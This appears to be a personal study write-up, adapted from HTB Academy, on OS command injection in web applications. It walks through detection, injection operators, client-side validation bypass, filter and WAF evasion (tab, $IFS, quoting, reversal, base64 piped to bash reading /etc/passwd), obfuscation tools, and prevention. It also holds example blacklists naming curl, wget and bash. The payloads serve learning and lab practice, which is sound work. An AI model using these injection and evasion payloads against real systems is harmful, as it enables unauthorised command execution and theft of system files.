> This section is based on material from HTB Academy, rewritten and adapted to my understanding and documentation style. If you want more insight, you can visit their page.

### Command Injection

**Command injection** is one of the most critical vulnerabilities in web applications. It allows an attacker to **execute operating system commands directly on the back-end server**, which can lead to **full system compromise and, in more advanced scenarios, compromise of the internal network**.

This type of vulnerability typically leads to **remote code execution (RCE)**, privilege escalation, theft of sensitive information, and lateral movement within the infrastructure.

---

**What is command injection?**

**Command injection** is a vulnerability that occurs when an application **does not properly validate or filter user input**, allowing that input to be interpreted as **operating system commands or executable code**.

This vulnerability is part of the **OWASP Top 10**, specifically under the category **A05: Injection**:
[https://owasp.org/Top10/2025/A05_2025-Injection/](https://owasp.org/Top10/2025/A05_2025-Injection/)

---

**Most common types of injections**

|Injection|Description|
|---|---|
|Operating system command injection|Occurs when user input is used directly as part of an operating system command.|
|Code injection|Occurs when user input is dynamically evaluated within a function that executes code.|
|SQL injection|Occurs when user input is directly concatenated into a SQL query.|
|XSS / HTML injection|Occurs when user input is displayed without sanitization on a web page.|

In addition, there are other types of injection such as:
`LDAP Injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, among others.

---

## Command Injection Detection

The process of detecting command injection is similar to that used to identify other injection vulnerabilities. It consists of **manipulating user input** with different operators and techniques until **changes in behavior or command output** are observed.

In more advanced scenarios, detection may require:

- **Parameter fuzzing**
- **Source code review**
- **Server behavior analysis**
- **Input validation and sanitization testing**

---

### Test Scenario

When visiting the web application shown in the following image, we observe a utility called **Network Diagnostic Tool**, which prompts for an IP address to verify network connectivity.

The functionality suggests that the server executes a diagnostic command, likely `ping`, using the user-provided input directly.

---

**Initial test**

As a first step, we can enter the local IP address:

<img src="/budahacksecurity/uploads/md_images/iy/iy.png" style="max-width:100%; border-radius:8px;">

The result indicates that the server correctly executes the connectivity test, which allows us to infer that the command executed on the backend is similar to:

```
ping -c 1 127.0.0.1
```

<img src="/budahacksecurity/uploads/md_images/iy/iy2.png" style="max-width:100%; border-radius:8px;">

Even without access to the source code, the application's behavior allows us to deduce how the command is constructed on the server.


## Command Injection Methods

To inject additional commands, we can use **operating system operators** that allow chaining or executing additional instructions.

| Operator      | Character   | URL Encoded    | Behavior                                                    |
| ------------- | ----------- | -------------- | ----------------------------------------------------------- |
| Semicolon     | `;`         | `%3b`          | Executes both commands                                      |
| New line      | `\n`        | `%0a`          | Executes both commands                                      |
| Background    | `&`         | `%26`          | Executes both (the second output may appear first)          |
| Pipe          | \|          | %7c            | Executes the first, then the second                         |
| Logical AND   | `&&`        | `%26%26`       | Executes the second only if the first succeeds              |
| OR            | \|\|        | %7C%7C         | Executes the second if the first fails                      |
| Sub-shell     | `` `cmd` `` | `%60cmd%60`    | Executes both (**Linux**)                                   |
| Sub-shell     | `$(cmd)`    | `%24%28cmd%29` | Executes both (**Linux**)                                   |

We can enter an expected value (an IP) and then append an additional command using one of the operators above:

```
ping 127.0.0.1 ; id
```

If the application **does not properly validate or sanitize** the input, the server will execute both commands.

<img src="/budahacksecurity/uploads/md_images/iy/iy3.png" style="max-width:100%; border-radius:8px;">

By observing that:

- The additional command executes
- The output changes from the normal behavior
- No sanitization exists on the backend

We can confirm that the application is **vulnerable to operating system command injection**.


---
In some scenarios we may encounter validation mechanisms implemented only on the **client side**, for example through JavaScript or HTML attributes such as `pattern`.

In our lab, the form only allows entering valid IPv4 addresses, blocking any value that does not match the configured regular expression.

<img src="/budahacksecurity/uploads/md_images/iy/iy4.png" style="max-width:100%; border-radius:8px;">

It is important to understand that:

> Front-end validation is **NOT a security mechanism**, it is only a usability aid.

The browser may prevent the form from being submitted, but the server does not depend on that validation.

An attacker can:

- Intercept the request
- Manually modify the parameter
- Send it directly to the server


**Bypass Procedure**

1. Enter a valid IP so the form allows submission.
2. Send the request to Burp Suite's **Repeater** using `Ctrl + R`.
3. Inside the Repeater, modify the `host` parameter.

Conceptual example of the intercepted request:

```
GET /ping?host=127.0.0.1 HTTP/1.1
```
Replace the value with a manipulated one.

Example with URL encoding:
```
127.0.0.1%20;%20id
```
<img src="/budahacksecurity/uploads/md_images/iy/iy5.png" style="max-width:100%; border-radius:8px;">

> Note: `%20` and `+` represent a URL-encoded space.

When resending the request, the server processes the new value since **no backend validation exists**.


---

We could also bypass the validation if the parameter is directly exposed in the URL, as in this case:

```
/ping?host=127.0.0.1
```

When we access the application through the form, the JavaScript validation executes before the request is sent. However, if the attacker manually modifies the URL in the browser's address bar, client-side validation no longer intervenes, since it only executes during the form's `onsubmit` event.

For example, if we initially access:

```
http://localhost:8000/ping?host=127.0.0.1
```
<img src="/budahacksecurity/uploads/md_images/iy/iy6.png" style="max-width:100%; border-radius:8px;">

The server will process the request normally. However, if we directly alter the value of the `host` parameter in the URL and send the request, the backend will receive the new value without applying any additional validation, as long as no server-side control exists.

This demonstrates that validation implemented only on the front-end can be bypassed simply by manipulating the URL, without needing to interact with the form. Consequently, any application that relies exclusively on browser-side controls is exposed to direct HTTP parameter manipulation.

From a security standpoint, this behavior confirms that the browser is not a trusted environment and that all critical validations must be mandatorily implemented on the server before executing any sensitive logic or system commands.

---
## Logical Operators

An important aspect to consider is that we can also use **logical operators** to attempt command injection. The most common operators are **AND (`&&`)** and **OR (`||`)**.

These operators allow **conditional execution control** of the injected commands, depending on the result of the original command.

---

**AND Operator (`&&`)**

The **AND (`&&`)** operator executes the second command **only if the first one executes successfully**.

Example in a vulnerable scenario:

```
ping -c 1 127.0.0.1 && whoami
```
In this case:

- If the `ping` command executes successfully
- The system will proceed to execute `whoami`

As shown in the following image, both commands execute correctly, confirming the presence of **command injection**.

<img src="/budahacksecurity/uploads/md_images/iy/iy7.png" style="max-width:100%; border-radius:8px;">


---

**OR Operator (`||`)**

The **OR (`||`)** operator executes the second command **only if the first one fails**.

Example:

```
ping -c 1 127.0.0.1 || whoami
```

This operator is useful when the original command **fails deliberately**, allowing the injected command to execute as an alternative.

<img src="/budahacksecurity/uploads/md_images/iy/iy8.png" style="max-width:100%; border-radius:8px;">


---

**Pipe Operator (`|`)**

Although **not a logical operator**, the **pipe (`|`)** operator is especially relevant in command injection scenarios, as it allows **redirecting the output of one command as input to another**.

Example:
```
ping -c 1 127.0.0.1 | whoami
```
This operator is useful when:

- Only the output of the second command is displayed
- Simple validations need to be evaded
- Commands need to be chained without depending on the success state of the first one

The operators used for exploiting injection vulnerabilities are **not limited to command injection alone**. They can also be used in other attack vectors such as **SQL injection, LDAP, XSS, SSRF, XXE**, among others.

Below is a list of **commonly used operators**, keeping in mind that their effectiveness **depends on the context, language, framework, and backend environment**.

**Common operators by injection type**

| Injection Type                              | Common Operators                                  |
| ------------------------------------------- | ------------------------------------------------- |
| SQL Injection                               | `'` `"` `;` `--` `/* */`                          |
| OS Command Injection                        | `;` `&&` `&` `\|`                                 |
| LDAP Injection                              | `*` `(` `)` `&` `\|`                              |
| XPath Injection                             | `'` `or` `and` `not` `substring` `concat` `count` |
| Code Injection                              | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory / Path Traversal                  | `../` `..\\` `%00`                                |
| Object Injection                            | `;` `&` `\|`                                      |
| XQuery Injection                            | `'` `;` `--` `/* */`                              |
| Shellcode Injection                         | `\x` `\u` `%u` `%n`                               |
| HTTP Header Injection                       | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

This table is **not exhaustive**. There are multiple variants and combinations of operators that can be used depending on:

- The operating system
- The programming language
- The web framework
- How the input is processed
- The presence or absence of filters and sanitization


---

## Identifying Filters

As demonstrated in multiple scenarios, **mitigating only on the client side is not effective**, since these types of controls can be **easily bypassed** through direct request manipulation.

For this reason, applications often implement **additional backend controls**, such as the use of **blacklists of characters or keywords**, with the goal of detecting injection attempts and **blocking the request when a suspicious pattern is identified**.

**Blacklist-based filters**

These mechanisms look to identify the presence of:

- Operators (`;`, `&&`, `|`, `||`)
- Keywords (`cmd`, `exec`, `system`, `whoami`)
- Special sequences (`../`, `$()`, `` ` ``)

However, this approach has multiple limitations, since blacklists can be **incomplete** and **susceptible to evasion** through obfuscation, encoding, or command concatenation techniques.

**Web Application Firewalls (WAF)**

An additional layer of protection commonly used is the **Web Application Firewall (WAF)**. These systems analyze HTTP requests and apply rules to **detect and block injection attempts**, including:

- Command injection
- SQL injection
- Cross-Site Scripting (XSS)
- Other application-level attacks

WAFs can offer a **broader scope** and advanced detection mechanisms, such as signatures, heuristics, and behavior analysis.

---
### WAF Detection

When attempting to enter the injection operators previously used (**`;`**, **`||`**, **`&&`**, **`|`**), the application responds with an **HTTP 403 Forbidden** status code, indicating that the request was **blocked before reaching the backend**.

This behavior is characteristic of the presence of a **Web Application Firewall (WAF)**, which intercepts HTTP requests and applies security rules to detect patterns associated with injection attempts.


---

## Identifying Blacklists

In many scenarios, the application **does not explicitly indicate which character or operator is being blocked**, making it difficult to identify whether the restriction is based on **individual characters**, **system commands**, or **logical operators**.

This is often due to the implementation of **multiple backend blacklists**, each focused on a specific type of detection.

**Example implementation in Python**

A common example of this approach can be seen in the following code:

```
BLACKLIST_CHARS = [";", "|", "&", "`", ">", "<", "\n", "\r"]

BLACKLIST_PATTERNS = [
    r"\bls\b",
    r"\bid\b",
    r"\bwhoami\b",
    r"\bpwd\b",
    r"\bcurl\b",
    r"\bwget\b",
    r"\bpython\b",
    r"\bperl\b",
    r"\bbash\b",
    r"\bsh\b"
]

BLACKLIST_LOGICAL = ["&&", "||"]
```
**Example implementation in PHP**

```
<?php

$blacklist_chars = [
    ";",
    "|",
    "&",
    "`",
    ">",
    "<",
    "\n",
    "\r"
];

$blacklist_patterns = [
    "/\bls\b/i",
    "/\bid\b/i",
    "/\bwhoami\b/i",
    "/\bpwd\b/i",
    "/\bcurl\b/i",
    "/\bwget\b/i",
    "/\bpython\b/i",
    "/\bperl\b/i",
    "/\bbash\b/i",
    "/\bsh\b/i"
];

$blacklist_logical = [
    "&&",
    "||"
];

foreach ($blacklist_chars as $char) {
    if (strpos($input, $char) !== false) {
        die("Blocked by character blacklist");
    }
}

foreach ($blacklist_logical as $op) {
    if (strpos($input, $op) !== false) {
        die("Blocked by logical operator blacklist");
    }
}

foreach ($blacklist_patterns as $pattern) {
    if (preg_match($pattern, $input)) {
        die("Blocked by command blacklist");
    }
}
?>
```
In this example, **three distinct blacklists** are identified:

- **Character blacklist**, used to block dangerous symbols
- **Command blacklist**, focused on operating system keywords
- **Logical operator blacklist**, used to prevent conditional command execution

**Practical implications**

When **source code access is unavailable**, it is necessary to **test different characters, operators, and commands** until identifying which ones are being filtered and which are not.

This process is typically performed:

- Manually (controlled testing)
- Automatically using **fuzzing** tools

However, the use of fuzzing must be handled carefully, as it **generates a high volume of requests in a short period of time**, which can:

- Trigger detection mechanisms
- Cause temporary blocks
- Generate alerts in the WAF or IDS


---

## Bypassing Space Filters

During testing, we were able to identify a character that allows bypassing both the WAF and the blacklist implemented on the backend: **`\n` (newline)**.

<img src="/budahacksecurity/uploads/md_images/iy/iy9.png" style="max-width:100%; border-radius:8px;">


When attempting to execute an additional command, the application responds again with a **request block (403 Forbidden)**.

This indicates that, although we managed to bypass the filter using the newline character (`\n`), the system continues to apply restrictions on other elements of the input.

A possible cause is the existence of a **specific blacklist for spaces**, blocking common representations such as:

- Normal space: `" "`
- `+`
- `%20` (URL encoding of space)

Many basic filters detect injection attempts when they find a pattern like:

```
127.0.0.1;   whoami
```

since the space separates the command from the argument.

<img src="/budahacksecurity/uploads/md_images/iy/iy11.png" style="max-width:100%; border-radius:8px;">


## Using the Tab Character as Bypass

An effective technique to bypass filters that block the space character is to use the **horizontal tab**, represented as **%09**.

In many systems, both **Linux** and **Windows**, the tab is interpreted as a valid separator between arguments, just like a space.

<img src="/budahacksecurity/uploads/md_images/iy/iy12.png" style="max-width:100%; border-radius:8px;">

We successfully bypassed the filter.

**Why does it work?**

If the filter blocks:

- `" "` (space)
- `+`
- `%20`

but does not account for `%09`, then we can replace the space with a tab.

---

**Using the $IFS Variable**

Another effective technique to bypass filters that block spaces is to use the Linux environment variable **`$IFS`** (_Internal Field Separator_).

In Unix/Linux systems, `$IFS` defines the characters that the command interpreter uses as argument separators.
By default, its value includes:

- Space
- Tab
- Newline

This means it can be used as a substitute for spaces in commands.

<img src="/budahacksecurity/uploads/md_images/iy/iy13.png" style="max-width:100%; border-radius:8px;">


We observe that the request **was not denied** and managed to bypass the space filter once again, confirming that the applied technique was effective.

This demonstrates that the filtering mechanism implemented in the application:

- Does not properly normalize the input.
- Does not account for environment variables such as `$IFS`.
- Is based on an incomplete blacklist.

---

**Multiple Bypass Techniques**

There are multiple techniques to bypass filters that block spaces. Some of them include:

- Using tab (`%09`)
- Using newline (`%0a`)
- Using `$IFS`
- Variable concatenation
- Parameter expansion
- Partial encoding

To explore more advanced bypass techniques, you can consult the repository:

**[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)**

It is a widely used reference in the field of penetration testing and contains practical bypass examples for different types of injection.

---

# Bypassing Filters: Forward Slash `/` and Backslash `\`

A character commonly blocked in blacklists is the **forward slash (`/`)** and the **backslash (`\`)**, as they are required to specify paths on **Linux** and **Windows** systems.

However, there are techniques that allow generating these characters without writing them directly, thus bypassing the filter.

---

**Linux**

On Linux there are several techniques to produce blocked characters using **environment variables**, as we did previously with `${IFS}`.

Although there is no specific variable that contains only `/` or `;`, we can extract individual characters from existing variables using **substring expansion**.

---

**Using environment variables**

For example, if we print the `PATH` variable:

```
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

If we take the character at position `0` with length `1`:

```
echo ${PATH:0:1}

/
```

We obtain only the `/` character.

---

**Another example**

We can inspect variables with:

```
printenv
```

And then extract specific characters. For example:

```
echo ${LS_COLORS:10:1}

;
```

This allows generating blocked characters without writing them directly in the payload.

---

**Windows**

The same concept works on Windows.

**CMD**

We can use variable expansion:

```
echo %HOMEPATH:~6,-11%

\
```

Explanation:

- `%HOMEPATH%` → `\Users\htb-student`
- `~6` → starts from position 6
- `-11` → removes the last 11 characters
- Result → `\`

---

**PowerShell**

In PowerShell, variables can be treated as character arrays:

```
$env:HOMEPATH[0]

\
```

We can also list all environment variables with:

```
Get-ChildItem Env:
```

And select one that contains the character we need.

---

**Character Shifting**

Another technique consists of generating characters through ASCII table shifting.

On Linux, we can use `tr` to shift characters:

```
man ascii     # \ is 92, before it is [ which is 91
echo $(tr '!-}' '"-~'<<<[)

\
```

In this example:

- `[` (ASCII 91)
- Shifted by +1
- Result → `\` (ASCII 92)

This technique allows generating characters without writing them explicitly.

---

# Bypassing Command Blacklists

A **command blacklist** consists of a set of prohibited words (e.g., `whoami`, `ls`, `id`, `pwd`, etc.).
If the system detects any of these words in the request, it blocks execution.

However, if we manage to **obfuscate the command** so it does not exactly match the filtered string, it is possible to bypass this type of protection.

---

Blacklist-based filters usually look for exact text matches.

If the filter detects:

whoami

It will block the request.
But if the shell correctly interprets the command even though the text is fragmented, the filter may not detect it.

---

# Linux and Windows

A common technique consists of **inserting characters that the shell ignores or interprets without altering the final result**.

Both **Bash** on Linux and **PowerShell / CMD** on Windows can correctly interpret commands that contain interspersed quotes.

For example:

```
w'h'o'am'i
```
It also works with double quotes:

```
w"h"o"am"i
```

<img src="/budahacksecurity/uploads/md_images/iy/iy14.png" style="max-width:100%; border-radius:8px;">


We observe that by entering in the URL the techniques used to bypass:

- Space filters
- Command blacklists

The injection executed successfully.

---

# OS-Specific Techniques


**Linux Only**

On Linux systems (Bash), we can insert certain characters within the command that do not alter its execution.

**Using `$@`**

who$@mi

`$@` normally expands to the script's arguments.
If no arguments are defined, it may expand as an empty string, allowing the command to be reconstructed:

```
whoami
```

**Using backslash `\`**

```
w\h\o\am\i
```

In Bash, the backslash acts as an escape character.
The shell correctly interprets the command, ignoring the visual effect of the intermediate escape.

Final executed result:

```
whoami
```
---

**Windows Only**

On Windows (CMD), the `^` character works as an escape character.

**Using `^`**

```
who^ami
```

The command interpreter ignores the `^` and executes:

```
whoami
```
---

### Advanced Command Obfuscation

In some scenarios we may face more robust filtering mechanisms, such as **WAFs (Web Application Firewalls)** or better-implemented server-side validations.

In these cases, basic evasion techniques (such as case manipulation or alternative spaces) may not be sufficient.

Therefore, it is necessary to apply more advanced obfuscation techniques that:

- Alter the visible structure of the command
- Fragment keywords
- Dynamically build commands
- Use shell expansions
- Avoid direct matches with blacklists

The goal is to reduce the probability of detection by making the injected command not literally match the filtering system's rules.

### Case Manipulation

Case manipulation consists of altering uppercase and lowercase letters within a command to bypass blacklist-based filters.

Examples:

```
WHOAMI
WhOaMi
wHoAmI
```

---

**Windows**

On Windows (CMD / PowerShell), commands are **case-insensitive**, so they execute regardless of the format:

```
WhOaMi
```

Works the same as:

```
whoami
```

---

**Linux**

When dealing with Linux and a **bash** shell, which is case-sensitive, we need to be more creative.

We can use a command that dynamically transforms the text before executing it.

Example:

```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

root
```

When executing it in the terminal we observe that the command executes correctly, even though the provided word was **WhOaMi**.

This payload uses `tr` to replace all uppercase characters with their lowercase equivalents.

When we test it on the vulnerable web application, the command executes correctly, allowing us to bypass filters that only block the exact word `whoami`.

<img src="/budahacksecurity/uploads/md_images/iy/iy15.png" style="max-width:100%; border-radius:8px;">


> ⚠ Note: This method works in **bash**, as it uses the `<<<` syntax (here-string), which is not compatible with `/bin/sh`.


We can use different methods in **bash** to dynamically transform the command and bypass filters based on exact matches.

|#|Technique|Payload|Description|
|---|---|---|---|
|1|Parameter expansion|`$(a="WhOaMi"; printf %s "${a,,}")`|Converts the variable content to lowercase using `${var,,}`.|
|2|Using `tr`|`$(echo WhOaMi \| tr 'A-Z' 'a-z')`|Replaces uppercase with lowercase before executing.|
|3|Using `awk`|`$(echo WhOaMi \| awk '{print tolower($0)}')`|Uses `tolower()` to dynamically transform the text.|
|4|Fragmentation and cleanup|`$(echo w h o a m i \| tr -d ' ')`|Reconstructs the command by removing intermediate spaces.|
|5|Variable concatenation|`$(a=who; b=ami; echo $a$b)`|Splits the word into parts to avoid direct matching.|
|6|Hexadecimal encoding|`$(printf "\x77\x68\x6f\x61\x6d\x69")`|Builds the command using ASCII values in hexadecimal.|

---

**Reversed Commands**

Another obfuscation technique consists of **reversing the original command** and then reconstructing it at runtime.

The idea is to avoid writing the word that is directly blocked by the blacklist, as follows:

First step: in the terminal we can reverse it with `rev`:
```
echo "whoami" | rev

imaohw
```

Then we reverse it again using a subshell `$()`:

```
$(rev<<<'imaohw')

root
```

Now that we confirmed the payload works correctly in the terminal, we proceed to test it in the vulnerable web application to verify whether it can bypass the implemented blacklist.

If the filter only blocks the exact word **whoami**, but does not detect its reversed version **imaohw**, the command will be reconstructed at runtime and executed successfully on the server.

In this way we verify whether the filtering mechanism is superficial and susceptible to dynamic obfuscation techniques.

<img src="/budahacksecurity/uploads/md_images/iy/iy16.png" style="max-width:100%; border-radius:8px;">


## **Reversed Commands on Windows**

The same technique can be applied in Windows environments using **PowerShell**.

**Reversing the string**

We can reverse a string using negative indexing:

```
PS C:\> iex "$('imaohw'[-1..-20] -join '')"

imaohw
```

- `[-1..-20]` traverses the string in reverse order
- `-join ''` joins the characters without spaces

**Reconstruction and dynamic execution**

Now we can execute the reversed string using a sub-shell with `iex` (Invoke-Expression):

```
PS C:\> iex "$('imaohw'[-1..-20] -join '')"

root
```

---

## **Encoded Commands**

This technique is useful when the command contains filtered characters or characters that may be modified during URL decoding before reaching the shell.

Instead of sending the command directly, we can **encode it** and then **decode it at runtime**.
This reduces the probability of detection by filters or WAFs.

Each payload can be unique depending on:

- Allowed characters
- Filter type
- Server validation level

---

**Encoding the command**

Example with `base64`:

```
echo -n 'cat /etc/passwd | grep 33' | base64
```

Output:

```
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

---

**Decode and execute at runtime**

Now we decode the string and pipe it to bash for execution:

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

This causes:

1. `base64 -d` to decode the content
2. `<<<` to pass it as input
3. `bash` to execute the result

The original command is reconstructed and executed dynamically.

<img src="/budahacksecurity/uploads/md_images/iy/iy17.png" style="max-width:100%; border-radius:8px;">


---

## **Evasion Tools**

When facing advanced security mechanisms (WAF, robust validations, EDR), manual techniques may not be sufficient.

In these cases, it is recommended to use **automated obfuscation tools**, which generate dynamic and complex payloads.

---

**Linux – Bashfuscator**

**Bashfuscator** is a tool designed to automatically obfuscate Bash commands.

**Basic installation:**

```
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

**Basic usage:**

```
./bashfuscator -c 'cat /etc/passwd'
```

The tool:

- Automatically selects obfuscation techniques
- Can generate very long payloads

To generate a shorter payload:

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

The result is a fully obfuscated command that executes the same original instruction.

---

**Windows – DOSfuscation**

On Windows we can use **Invoke-DOSfuscation**, an interactive tool to obfuscate CMD/PowerShell commands.

**Installation:**

```
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

**Basic usage:**

```
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
```

The tool generates a highly obfuscated command using environment variables and string manipulation.

---
# Preventing Command Injection

After analyzing how command injections are exploited and how filters are bypassed through obfuscation, it is essential to understand how to prevent this vulnerability in web applications. Defense should not be based on simple blacklists, but on a structured approach that combines secure development and proper server configuration.

Whenever possible, the use of functions that execute system commands (`system`, `exec`, `shell_exec`, etc.) should be avoided, and built-in language functions should be used instead. For example, in PHP, to check connectivity without using `ping`, the following can be used:

```php
fsockopen($host, 80);
```

If there is no alternative and executing a system command is strictly necessary, user input must never be directly concatenated. Input must be **validated and sanitized on the back-end**, and the use of these types of functions should be kept to a minimum.

Input validation ensures that data strictly matches the expected format. It must be implemented on both the front-end and back-end. In PHP, for example, an IP address can be validated with:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // execute function
} else {
    // deny request
}
```

In JavaScript or NodeJS, a strict regular expression can be used to validate the format before processing.

Validation alone is not enough. After validating, **input sanitization** must be performed, removing any unnecessary special characters. For example, in PHP:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

In JavaScript:

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

This approach removes characters that could be used for injection, such as `;`, `|`, `&`, `$`, `(`, `)`, or other shell operators. Simple blacklists are not sufficient, as they can be bypassed through obfuscation techniques. Escaping special characters is also not completely secure, as there are multiple methods to bypass it.

Effective prevention combines **secure coding best practices**, strict validation, proper sanitization, and constant penetration testing. Even a single error in a large application can introduce a critical vulnerability, so security must be addressed in a comprehensive and ongoing manner.


>  To apply the Command Injection concepts explained in this document, you can practice on the Internal machine available on the DockerLabs platform.